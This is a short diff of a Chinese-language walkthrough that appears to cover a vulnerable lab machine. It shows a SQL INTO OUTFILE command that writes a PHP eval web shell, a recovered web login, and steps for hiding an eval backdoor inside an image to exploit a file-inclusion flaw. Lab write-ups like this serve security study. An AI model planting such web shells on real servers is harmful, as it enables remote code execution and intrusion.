@@ -514,5 +514,5 @@ select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
 ## 6.利用panel.php页面文件包含漏洞
 使用在phpmyadmin中获取到的web口令biLLu：hEx_it登入，跳转到panel.php
 ###6.1 制作一个图片马
-我们可以准备一个内容为`<?php @eval($_POST['hello']); ?> `的txt文档和一张不要太大的图片
+我们可以准备一个内容为`<?php @eval($_POST['hello']); ?> `的txt文档和一张不要太大的图片(可以是png/jpg/bng什么的)
 然后使用``
